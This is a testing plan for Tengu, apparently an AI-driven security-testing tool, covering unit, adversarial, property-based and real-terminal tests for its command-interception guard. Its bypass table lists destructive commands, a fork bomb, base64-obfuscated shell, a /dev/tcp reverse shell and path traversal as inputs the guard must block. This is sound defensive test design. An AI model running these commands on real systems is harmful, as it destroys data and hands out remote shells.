# Tengu Deep Testing Plan

> **Purpose:** Move Tengu from its current 19 happy-path smoke tests to a defense-in-depth verification suite covering **Unit**, **Negative/Adversarial**, **Property-Based**, and **Real-Process / PTY Smoke & E2E** testing across all 5 packages (`@tengu/store`, `@tengu/intercept`, `@tengu/ops`, `@tengu/engine`, `@tengu/cli`) plus Seance integration.

---

## 1. Why Current Coverage Is Not Enough

### Current Baseline
- **19 `node --test` tests** across 5 files (~464ms) + **42 Cargo tests** in `seance`.
- Almost every test is a single-path happy-case check packed into large monolith test blocks.

### Real Bugs That Slipped Past Happy-Path Tests
Every major bug we hit during development maps directly to a missing test layer:
1. **Stale `tsconfig.build.tsbuildinfo` skipping `dist/` emit** → missing build/packaging smoke test.
2. **JSON-boundary regex miss in `hard_deny` (`rm -rf /` followed by `"` in serialized JSON)** → missing negative/adversarial intercept test.
3. **`Input.setValue("/")` leaving cursor at `0`** → missing unit + PTY keystroke sequence test.
4. **`TuiAltScreen` swallowing arrows & ignoring mouse (`addChild` vs `setLayoutRoot`, `capturesViewportInput`)** → missing real PTY + SGR mouse + VT100/Kitty keybinding test.
5. **`Ctrl+I` vs `Tab` ASCII `0x09` collision** → missing keybinding collision matrix test.
6. **Approval modal dismissed on open (`pendingApprovalResolve` set before `openScrollableModal()`)** → missing interactive `ask` handler E2E test.

### Untested / Under-Tested Modules
- `@tengu/cli`: `daemon.ts`, `pi-config.ts`, `cli.ts` argument parser & exit codes, `tui.ts` approval modal & mouse hit-testing & streaming races, `rpc.ts` error/malformed frames.
- `@tengu/engine`: `llm-pool.ts` failover/cooldown, `mcp-bridge.ts` config loading & failure isolation, `orchestrator.ts` Planner/Worker/Retester/SideQuestion error paths, `live-status.ts` stale/corrupt snapshots.
- `@tengu/ops`: `jobs.ts` timeouts/kill/workspace escape, `traffic-proxy.ts` upstream errors & malformed URLs, `vuln-intel.ts` offline/error fallbacks, `scopesentry.ts` HTTP failures, `enrich.ts` DNS failures.
- `@tengu/intercept`: obfuscated shell/Python bypasses, scope-guard URL/IP/CIDR/domain spoofing, judge timeout/garbage-JSON fail-safe.
- `@tengu/store`: corrupt inputs, SQLite concurrency/WAL contention, `updateTaskConfig()` partial/invalid updates, `getTaskUsageBreakdown()` null-cost edge cases.

---

## 2. Test Architecture, Isolation & Tooling

### Hard Isolation Rules
1. **Never touch `~/.tengu/tengu.db` or `~/.tengu/sessions/`** — all unit/negative/property tests use `:memory:` SQLite and `mkdtempSync(join(tmpdir(), "tengu-test-"))` with cleanup in `after()`/`finally`.
2. **Child processes run with isolated `HOME` / `TENGU_HOME`** pointing to a temp directory so CLI, daemon, and PTY tests cannot read or mutate real user state.
3. **Zero external network calls** — all HTTP, webhook, proxy, OOB listener, ScopeSentry, VulnIntel, and LLM API tests run against ephemeral `127.0.0.1:0` local Node `http.createServer` / `net.createServer` fixtures.
4. **Deterministic & reproducible** — property tests use a seeded PRNG (`mulberry32`) controlled by `TENGU_TEST_SEED` (printed on failure) and `TENGU_PROP_RUNS` (default `200`, bumpable to `2000+` for soak runs), with built-in shrinking on failure. Zero extra runtime dependencies required.

### Directory Layout & npm Scripts
```text
packages/
  tengu-store/test/
    store.test.ts            # existing + expanded unit tests
    store.negative.test.ts   # negative & concurrency tests
    store.property.test.ts   # Scope Guard, Asset DSL, dual graph properties
  tengu-intercept/test/
    intercept.test.ts        # existing + expanded unit tests
    intercept.negative.test.ts # bypasses, obfuscation, judge failures
    intercept.property.test.ts # verdict determinism, precedence properties
  tengu-ops/test/
    ops.test.ts              # existing + expanded unit tests
    ops.negative.test.ts     # corrupt archives/evidence, HTTP/proxy/job/DNS failures
    ops.property.test.ts     # masking, evidence SHA-256, archive round-trip, DOCX ZIP
  tengu-engine/test/
    engine.test.ts           # existing + expanded unit tests
    engine.negative.test.ts  # LlmPool failover, MCP failures, orchestrator errors
    engine.property.test.ts  # compaction invariants
  tengu-cli/test/
    cli.test.ts              # existing + expanded unit tests
    console.test.ts          # existing + approval modal, mouse, races
    cli.negative.test.ts     # corrupt JSONL/config, malformed RPC, tiny terminals
    cli.property.test.ts     # sliceWindow, render(cols, rows), session JSONL round-trip
    smoke.cli.test.ts        # real CLI binary + JSON-RPC stdio subprocess tests
    smoke.daemon.test.ts     # real detached daemon start/status/SIGUSR1/SIGTERM/SIGKILL
    smoke.pty.test.ts        # real PTY TUI harness (VT100, Kitty CSI-u, SGR mouse, SIGWINCH)
test/
  helpers/
    prng.ts                  # seeded PRNG, generators, shrinker, assertProperty()
    mock-servers.ts          # local OpenAI-compatible mock LLM, HTTP target, webhook, proxy
    pty-driver.py            # minimal Python pty/termios/SIGWINCH driver for smoke.pty.test.ts
```

Proposed `package.json` scripts:
- `npm run test:unit` — all `*.test.ts` (excluding `*.negative.*`, `*.property.*`, `smoke.*`)
- `npm run test:negative` — all `*.negative.test.ts`
- `npm run test:property` — all `*.property.test.ts`
- `npm run test:smoke` — all `smoke.*.test.ts` (requires fresh `dist/`)
- `npm run test:seance` — `cargo test` in `../seance`
- `npm run test:all` — clean `tsbuildinfo` → `build:tengu` → `unit` → `negative` → `property` → `smoke` → `seance`

---

## 3. Layer 1: Unit Testing (Per-Package Matrix)

### 3.1 `@tengu/store` (`types.ts`, `asset-dsl.ts`, `sqlite-store.ts`)
- **Tasks & Config**: create, list, get, update status, `updateTaskConfig()` (model, target, scope, maxSteps, autonomous mode, custom fields), delete/cascade behavior.
- **Dual Graph**: Asset upsert & dedup, AssetEdge creation, ExplorationNode/Edge creation, graph queries by type/status/parent.
- **Cross-Task Inheritance**: `parentTaskId` chain (single level + multi-level), `inherited: true` tagging, child mutations do not mutate parent.
- **Asset DSL**: `=`, `!=`, `~`, `in`, `AND`, `OR`, `NOT`, parenthesized grouping, field accessors (`host`, `port`, `service`, `tag`, `status`, `severity`).
- **Scope Guard**: exact domain, wildcard `*.example.com`, IPv4, IPv4 CIDR (`/0`, `/8`, `/24`, `/32`), URL prefix, regex rule, explicit exclusion precedence.
- **Findings & Retests**: create/update/list findings, CVSS/severity normalization, `addFindingRetest()` linking & history ordering.
- **Usage Breakdown**: `getTaskUsageBreakdown()` with known costs, zero-cost models, and `null` (unknown) costs — ensuring `null` is preserved and never coerced to `0`.
- **Traces, Logs, Memories, Intercept Rules**: CRUD, filtering by task/type/limit, ordering.

### 3.2 `@tengu/intercept` (`builtin-rules.ts`, `static-analyzer.ts`, `engine.ts`)
- **Builtin Rules**: verify every single built-in `hard_deny`, `judge`, and `ask` rule matches its intended positive trigger and does NOT false-positive on benign commands (e.g., `ls /`, `cat /etc/hosts`, `curl https://in-scope.test/api`).
- **Static Analyzer**: shell pipeline splitting (`|`, `&&`, `;`, `$(...)`, backticks), Python AST/regex detection (`os.system`, `subprocess`, `socket`, `exec`, `eval`), network target extraction.
- **Intercept Engine**:
  - 3-layer evaluation order: `hard_deny` → Scope Guard → `judge` → `ask` → `allow`.
  - Rule enable/disable toggling and custom user-added rules.
  - Audit/event recording for every decision.

### 3.3 `@tengu/ops` (13 modules)
- **`evidence.ts`**: `putArtifact()`, `getArtifact()`, `inspectArtifact()` (`readable`/`missing`/`corrupt`), `exportArtifact()` to target path, deduplication by SHA-256.
- **`http-ops.ts`**: HTTP request builder, auth session injection (Bearer/Basic/Cookie/Custom), response diffing (status/headers/body), API contract checker, endpoint prober, JS static audit (secrets, endpoints, sinks).
- **`jobs.ts`**: background job spawn, stdout/stderr capture, status polling, script workspace create/read/list/execute.
- **`listener.ts`**: HTTP callback capture (method, path, headers, body, timestamp), raw TCP callback capture, start/stop lifecycle, multiple concurrent listeners.
- **`traffic-proxy.ts`**: HTTP forward proxy recording, `maskTrafficRecord()` redaction rules, HAR 1.2 export schema validation.
- **`vuln-intel.ts`**: local cache lookup, CISA KEV / NVD / GHSA / Nuclei template matcher (against mocked local endpoints).
- **`scopesentry.ts`**: asset pull/push payload mapping against local mock server.
- **`notify.ts`**: `previewPayload()` for every channel (Slack, Discord, DingTalk, Feishu, WeCom, Webhook, Email), real HTTP delivery against local mock server.
- **`report.ts` & `docx.ts`**: Markdown, JSON, SARIF 2.1.0 (schema fields: `version`, `runs[].tool.driver.rules`, `results`), HTML (XSS escaping of finding fields!), single-finding report with linked retests, OOXML DOCX ZIP structure (`[Content_Types].xml`, `_rels/.rels`, `word/document.xml`).
- **`archive.ts`**: `exportTaskArchive()`, `validateTaskArchive()`, `restoreTaskArchive()` (new ID mapping, artifact restoration, retest/edge preservation).
- **`hosttools.ts` & `enrich.ts`**: binary discovery on custom `PATH`, version extraction, DNS `A`/`AAAA`/`CNAME`/`TXT`/`MX` enrichment with injectable resolver.

### 3.4 `@tengu/engine` (8 modules)
- **`tools.ts`**: verify all 62 registered tools have valid JSON schemas, unique names, non-empty descriptions; test every conversational config/control tool (`set_target`, `update_scope`, `configure_task`, `add_intercept_rule`, etc.) mutates store state accurately.
- **`skills.ts`**: verify all 23 built-in skills load cleanly, have valid frontmatter/body, and `load_skill` resolves by exact name and fuzzy/alias lookup.
- **`prompts.ts`**: system prompt generation for Planner, Worker, MainAgent, Retester, SideQuestion modes includes target, scope, and task constraints.
- **`llm-pool.ts`**: round-robin / priority selection, health tracking, failure marking, cooldown expiry, recovery.
- **`compaction.ts`**: `compactAgentMessages()` preserves system context, tool-call/tool-result pairing, and recent turns while summarizing/pruning older turns.
- **`mcp-bridge.ts`**: parsing `~/.tengu/mcp.json`, registering MCP tools with prefixing, clean shutdown.
- **`live-status.ts`**: writing/reading `run-<id>.status.json`, atomic temp-file rename, telemetry fields.
- **`orchestrator.ts`**: full step loop with mock Pi `Agent`, pause → resume, stop mid-turn, Coverage/Depth nudge injection, `tengu.log` writing, `llm_usage` persistence, Retester & SideQuestion flows.

### 3.5 `@tengu/cli` (8 modules) & `seance`
- **`sessions.ts`**: v3 JSONL header, append user/assistant/tool/meta entries, list sorted by mtime, load & reconstruct transcript, delete, session-to-task linking.
- **`pi-config.ts`**: reading `~/.pi/agent/settings.json` + `models.json`, resolving default provider/model, API key env resolution, model picker list.
- **`chat-stream.ts`**: state transitions (`idle` → `prefill` → `thinking` → `tool` → `streaming` → `done`/`aborted`), token/elapsed counters, thinking toggle.
- **`tui-theme.ts` & `tui.ts`**:
  - Keybinding table completeness & zero collisions (explicit regression test: `Tab` !== `Ctrl+G`, NO vi `hjkl` navigation).
  - `Ctrl+C` precedence: abort stream → clear input → arm double-press → exit on 2nd press within window (and reset after timeout).
  - `Ctrl+D` double-press on empty prompt → exit; ignored/forward-delete when input non-empty.
  - `Esc` precedence: abort stream → clear queue → clear input → close overlay.
  - `onRegisterAskHandler` → interactive approval modal (`Y` approves, `N` denies, `Esc` denies, opening another modal does NOT prematurely dismiss pending approval).
  - Mouse click hit-testing (header pills, sidebar tabs, session list rows, modal close) and focus-follows-mouse wheel scrolling.
  - Prompt history persistence across sessions (`Up`/`Down` recall, per-session unsent draft preservation).
- **`daemon.ts`**: spawn args, PID file read/write/remove, `isProcessAlive()`, `SIGUSR1`/`SIGTERM` signal helpers.
- **`rpc.ts`**: every JSON-RPC 2.0 method dispatch, `id` echo (string/number/null), notification (no `id`) produces no response.
- **`seance` (`pilike.rs`)**: `Agent::Tengu` session discovery, empty session, tool-call entries, multi-turn parsing, search indexing.

---

## 4. Layer 2: Negative & Adversarial Testing

### 4.1 Security & Intercept Bypass Suite (`tengu-intercept/test/intercept.negative.test.ts`)
| Attack / Failure Vector | Expected Safe Behavior |
|---|---|
| Destructive shell in JSON args (`{"command":"rm -rf /"}`, `rm -rf /*`, `mkfs.ext4 /dev/sda`, `dd if=/dev/zero of=/dev/sda`, `:(){ :\|:& };:`) | `hard_deny` — never reaches `judge` or `ask` |
| Obfuscated shell payloads (`rm$IFS-rf$IFS/`, `echo cm0gLXJmIC8= \| base64 -d \| sh`, `sh -c "rm -rf /"`, `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`) | Caught by static analyzer / `hard_deny` or escalated to `judge`/`ask` |
| Python dangerous payloads (`python3 -c "import os; os.system('rm -rf /')"`, `exec(chr(114)+...)`, reverse shell socket) | Flagged by static analyzer; never silently allowed |
| Scope-guard spoofing: `https://evil-example.com`, `https://example.com.evil.com`, `https://example.com@evil.com/path`, `http://127.0.0.1.nip.io` when scope is `example.com` | **Denied** (out of scope) |
| Scope-guard IP edge cases: `10.0.0.1` vs `10.0.1.0/24`, IPv4-mapped IPv6 `::ffff:10.0.0.1`, invalid CIDR `10.0.0.1/99`, malformed IP `999.999.999.999` | Denied cleanly; never throws unhandled exception |
| Exclusion precedence: target matches both `include: *.example.com` and `exclude: prod.example.com` | **Denied** (exclusion always wins) |
| LLM Judge throws network error / times out / returns non-JSON (`"I cannot help"`) / returns `{}` missing verdict / returns malformed JSON | **Fail-closed** (falls back to `ask` or `deny`, never silently `allow`s) |
| `ask` rule triggered with no `askHandler` registered (headless/non-interactive) | **Fail-closed** (`deny` with clear reason) |
| `ask` handler rejects/throws or returns unexpected value | **Fail-closed** (`deny`) |
| Invalid regex in custom user intercept rule or scope rule | Rejected cleanly on add or handled safely without crashing engine |

### 4.2 Data Integrity & Corruption Suite
- **Corrupt JSONL sessions**: truncated last line, invalid JSON line in middle, binary/NUL bytes, missing v3 header, empty 0-byte file, non-existent file → `SessionStore` skips/recovers gracefully or returns structured error without crashing TUI.
- **Corrupt config files**: malformed `~/.pi/agent/models.json`, `~/.pi/agent/settings.json`, `~/.tengu/mcp.json`, `~/.tengu/history.json` → graceful fallback + warning, never crashes startup.
- **Evidence corruption**: file deleted on disk → `inspectArtifact().status === "missing"`; 1 byte flipped on disk → `status === "corrupt"`; permission denied (`chmod 000`) → clean error; `exportArtifact()` on corrupt/missing artifact fails loudly instead of copying garbage.
- **Archive tampering & atomicity**:
  - Tampered checksum, modified finding text after export, missing referenced artifact blob, unsupported archive schema version, truncated JSON → `validateTaskArchive()` returns `valid: false` with specific errors.
  - `restoreTaskArchive()` on invalid archive or mid-restore failure rolls back SQLite transaction completely (zero orphaned tasks/assets/findings/artifacts left in DB).
- **SQLite negative & concurrency**:
  - Unknown `taskId`/`findingId`/`assetId` returns `null`/error cleanly (no unhandled `FOREIGN KEY constraint failed` crashes).
  - Concurrent writer + reader connections against the same WAL file (e.g. daemon writing traces while TUI/CLI reads status) succeed with `busy_timeout` and no `SQLITE_BUSY` crashes.
  - Oversized fields (1MB tool output, 100KB finding description, NUL bytes in strings).

### 4.3 Network, Process & External Service Failure Suite
- **`HttpOps`**: connection refused, socket hangup, timeout, HTTP 400/401/403/404/500/502/503, redirect loop (max redirects), invalid URL, non-UTF8 binary response body.
- **`NotificationDispatcher`**: HTTP 500/404, connection refused, timeout, unsupported channel type, missing webhook URL, invalid email relay config → returns `{ ok: false, error }` without throwing unhandled rejections.
- **`TrafficRecorderProxy`**: upstream 502/timeout, malformed proxy request target, non-HTTP garbage bytes on proxy socket.
- **`ListenerManager`**: binding to already-occupied port (`EADDRINUSE`) returns clean error; stopping already-stopped listener is idempotent; malformed HTTP request / binary TCP flood does not crash server.
- **`JobManager`**: command timeout kills process group cleanly; non-zero exit code captured accurately; missing binary (`ENOENT`) handled; script workspace path traversal (`../../etc/passwd`) **rejected**.
- **`VulnIntelClient` & `ScopeSentrySyncClient`**: offline/unreachable server, HTTP 401/429/500, invalid JSON body → graceful degraded result/error.
- **`LlmPool`**: single provider fails → automatic failover to healthy backup; all providers fail → clear error; provider recovers after cooldown window.
- **`AssetEnricher`**: NXDOMAIN, SERVFAIL, invalid hostname (`"not a host!!!"`) → empty/error result without crashing.

### 4.4 TUI, CLI & RPC Negative / Race Suite
- **Streaming + Session Switch Race**: start streaming assistant response in Session A → immediately switch to Session B (or `/new`) → verify Session A stream is aborted/isolated and chunks never bleed into Session B's transcript or JSONL file.
- **Approval Modal Races**: trigger `ask` modal → verify `Esc` denies, `N` denies, `Y` approves; verify pressing random keys does not leak into prompt composer behind the modal; verify opening another overlay doesn't silently auto-approve.
- **Tiny & Extreme Terminal Dimensions**: `20x8`, `40x12`, `50x15`, `240x80` across chat, sidebar open, scrollable modal, picker modal, approval modal → never throws, never exceeds `(cols, rows)`.
- **Hostile Display Content**: ANSI escape injection (`\x1b[2J`, `\x1b]0;pwn\x07`) in tool outputs, zero-width joiners, wide CJK/emoji (`日本語🔥`), 50KB single unbroken line → rendered safely within `cols`.
- **JSON-RPC 2.0 Negative**: malformed JSON (`-32700` Parse Error), non-object/missing `method` (`-32600` Invalid Request), unknown method (`-32601` Method Not Found), invalid/missing params (`-32602` Invalid Params), internal throw (`-32603` Internal Error), empty lines & EOF mid-stream.
- **CLI Argument Negative**: unknown subcommand, missing required flags, invalid task ID (`abc`, `-1`, `999999`), invalid report format (`--format pdf`), unwritable output path → clean stderr message + non-zero exit code, no stack trace dump.

---

## 5. Layer 3: Property-Based Testing (Invariants & Generators)

All property tests use a shared deterministic harness (`test/helpers/prng.ts`):
- `assertProperty(name, generator, predicate, { runs: 200, seed })`
- On failure, prints the exact `TENGU_TEST_SEED`, iteration number, and shrunk counterexample.

| # | Target | Generator | Mathematical / Structural Invariant |
|---|---|---|---|
| **P1** | `ScopeGuard` | Random domains, subdomains, IPs, CIDRs (`/0`–`/32`), URLs, include+exclude rule sets | (a) If any exclude rule matches, result is ALWAYS `false`. (b) Exact domain `a.b` NEVER matches `xa.b` or `a.b.c`. (c) IPv4 CIDR match equals exact bitwise `(ip & mask) === (net & mask)`. |
| **P2** | `AssetDSL` | Arbitrary random strings (ASCII, Unicode, unbalanced parens, quotes, operators) + valid generated ASTs | (a) Parser + evaluator NEVER throw uncaught exceptions on arbitrary input. (b) On valid ASTs: `NOT (A AND B) === (NOT A) OR (NOT B)` and `A AND A === A`. |
| **P3** | `maskSecrets` & `maskTrafficRecord` | Random HTTP headers/bodies/JSON with injected random secrets (Bearer tokens, `sk-...`, passwords, `Cookie`/`Set-Cookie`, `Authorization`) | (a) **Zero-leak**: none of the injected secret values appear verbatim in masked output. (b) **Idempotency**: `mask(mask(x)) === mask(x)`. |
| **P4** | `EvidenceStore` | Random byte buffers (`0` bytes to `64KB`) + random single-byte bit-flips | (a) `put(b)` is deterministic on SHA-256 and deduplicates identical blobs. (b) Any 1-byte mutation on disk makes `inspectArtifact().status === "corrupt"`. (c) Unlinking makes `status === "missing"`. |
| **P5** | `PortableTaskArchive` | Random task graphs (0–10 assets, edges, findings, retests, artifacts, memories) + random single-field mutations | (a) **Round-trip**: `export → validate → restore` preserves exact counts and field values. (b) **Tamper rejection**: any checksum/blob/manifest mutation fails `validateTaskArchive`. (c) **Atomicity**: failed restore leaves destination DB row counts identical to before. |
| **P6** | `buildDocxBuffer` | Random finding titles/descriptions with XML specials (`<`, `>`, `&`, `"`, `'`, `\0`, `\r\n`, CJK, emoji) | (a) Valid ZIP signatures (`PK\x03\x04`, `PK\x01\x02`, `PK\x05\x06`) and exact CRC32 for every entry. (b) Extracted `word/document.xml` has zero unescaped `<`/`&` outside valid XML tags and contains every finding's escaped title. |
| **P7** | `sliceWindow` | Random `totalLines ∈ [0..500]`, `height ∈ [1..80]`, `scrollOffset ∈ [-50..600]` | `result.lines.length <= height`, `0 <= start <= end <= totalLines`, `scrollOffset === 0` always ends at `totalLines` (tail-pinned). |
| **P8** | `TenguCockpitApp.render` | Random `(cols ∈ [40..200], rows ∈ [14..60])`, random sidebar mode, random Unicode/CJK/emoji/ANSI chat turns & modals | Every frame satisfies `lines.length === rows` AND `∀ line: visibleWidth(line) <= cols`. |
| **P9** | `compactAgentMessages` | Random message arrays (1–200 turns, varying lengths, tool calls/results) + random budgets | Output count/size respects budget, preserves chronological order, retains most recent turns, and is idempotent when re-run on already-compacted output. |
| **P10** | `SessionStore` JSONL | Random transcripts with quotes, newlines, backslashes, Unicode, empty strings, tool calls | `append` → `load` round-trips exact message count, roles, and content with zero data loss. |
| **P11** | Dual Graph Upsert | Random sequences of repeated asset/edge upserts with shuffled ordering | Upsert is idempotent (row count equals unique key count); child task inheritance never alters parent rows. |
| **P12** | `InterceptEngine` | Random permutations of rule orderings (`hard_deny`, `judge`, `ask`) + random tool calls | (a) Verdict is deterministic for identical inputs. (b) `hard_deny` ALWAYS beats `judge` and `ask` regardless of rule insertion order. |

---

## 6. Layer 4: Smoke & Real-Process End-to-End Testing

### 6.1 Real CLI Binary Smoke (`packages/tengu-cli/test/smoke.cli.test.ts`)
Spawns `node packages/tengu-cli/dist/cli.js` with an isolated temp `TENGU_HOME` / `HOME`:
- `--help`, `version`, `tools`, `skills` exit `0` with expected output.
- Full lifecycle via CLI commands: `task create` → `task list` → `task show` → `task config` → `asset add` → `asset list` → `intercept list` → `intercept test` → `finding report --format md|json|sarif|html|docx` → `task archive` → `task restore` (into second temp DB) → `evidence inspect` → `notify preview`.
- Negative CLI invocations (bad subcommand, missing required arg, invalid format) exit non-zero cleanly.
- Packaging check: `dist/cli.js` has `+x` permission and valid `#!/usr/bin/env node` shebang.

### 6.2 Real JSON-RPC 2.0 Stdio Smoke (`packages/tengu-cli/test/smoke.cli.test.ts`)
Spawns `node packages/tengu-cli/dist/cli.js rpc` over real stdin/stdout pipes:
- Sends multi-request sequence (`task.create`, `task.list`, `intercept.evaluate`, `session.list`), malformed JSON line (`-32700`), unknown method (`-32601`), then closes stdin.
- Asserts every response is valid newline-delimited JSON-RPC 2.0 with matching `id`, and process exits `0` cleanly on EOF.

### 6.3 Real Detached Daemon Lifecycle Smoke (`packages/tengu-cli/test/smoke.daemon.test.ts`)
Spawns a local mock OpenAI-compatible HTTP server (`127.0.0.1:0`) and runs real detached daemon commands against an isolated temp `TENGU_HOME`:
1. `tengu task start --bg` → exits `0`, prints PID, creates PID file and `run-<id>.status.json`.
2. `tengu task status` → reports running PID and live telemetry.
3. `tengu task pause` → delivers real `SIGUSR1` → status transitions to `paused`.
4. `tengu task stop` → delivers real `SIGTERM` → daemon exits cleanly, PID file cleaned up.
5. **Crash recovery**: start daemon → `SIGKILL` its PID externally → `tengu task status` detects stale PID, reports dead/stopped cleanly, and cleans up stale PID file.

### 6.4 Real PTY Interactive TUI Smoke (`packages/tengu-cli/test/smoke.pty.test.ts`)
Uses `test/helpers/pty-driver.py` (Python stdlib `pty`, `termios`, `fcntl.TIOCSWINSZ`, `select`) to drive the real compiled `tengu` binary inside a genuine Linux PTY:
1. Launch at `120x35` → assert alt-screen enter (`\x1b[?1049h`) and initial cockpit frame renders within timeout.
2. Send `/help\r` → assert help modal/output renders.
3. Send `Esc` → assert overlay closes cleanly.
4. Send `Tab` → assert sidebar toggles.
5. Send Kitty CSI-u `Shift+Enter` (`\x1b[13;2u`) + text → assert multiline composer stays open without submitting.
6. Send SGR mouse wheel (`\x1b[<64;10;10M`) → assert no crash or raw escape echo.
7. Trigger real `SIGWINCH` (`120x35` → `70x20` → `140x40`) → assert clean redraw with zero crash.
8. Send `Ctrl+C` (clears input) → `Ctrl+C` (arms exit hint) → `Ctrl+C` (exits cleanly with code `0` and restores main screen `\x1b[?1049l`).

### 6.5 Seance Interop Smoke
- Create a real Tengu session via `SessionStore` in a temp dir, run `cargo test` in `../seance` (including `parses_tengu_jsonl_session`), and verify schema compatibility whenever Tengu's session format changes.

---

## 7. Phased Implementation Order & Exit Criteria

| Phase | Scope | Target Tests | Exit Criteria |
|---|---|---|---|
| **Phase 1: Test Harness & Scripts** | `test/helpers/prng.ts`, `test/helpers/mock-servers.ts`, `test/helpers/pty-driver.py`, `package.json` scripts | Infrastructure | Deterministic seed logging + isolated temp helpers working |
| **Phase 2: Security & Data Negative Tests** | `intercept.negative.test.ts`, `store.negative.test.ts`, `ops.negative.test.ts` | ~45 tests | Every bypass, corruption, and failure mode fails closed/cleanly |
| **Phase 3: Property-Based Suites** | `store.property.test.ts`, `intercept.property.test.ts`, `ops.property.test.ts`, `engine.property.test.ts`, `cli.property.test.ts` | 12 properties × 200 runs = 2,400+ cases | Zero invariant violations; reproducible with `TENGU_TEST_SEED` |
| **Phase 4: Engine & CLI Negative/Unit Gaps** | `engine.negative.test.ts`, `cli.negative.test.ts`, expanded unit tests (approval modal, `LlmPool`, `jobs`, `traffic-proxy`, `mcp-bridge`, `daemon`, `pi-config`) | ~40 tests | All 38 source modules directly exercised |
| **Phase 5: Real-Process & PTY Smoke Suites** | `smoke.cli.test.ts`, `smoke.daemon.test.ts`, `smoke.pty.test.ts` | ~15 E2E scenarios | Full `npm run test:all` green from clean build, zero leaked processes or temp files |

### Definition of Done
- `npm run test:all` passes 100% cleanly after wiping `tsconfig.build.tsbuildinfo` and rebuilding.
- Zero tests touch `~/.tengu/tengu.db` or `~/.tengu/sessions/` or make external network calls.
- Total runtime stays fast enough for daily dev (`unit + negative + property` < 15s; `smoke` < 20s).
- Every bug discovered while writing these tests is fixed in source and locked down with a permanent regression test.
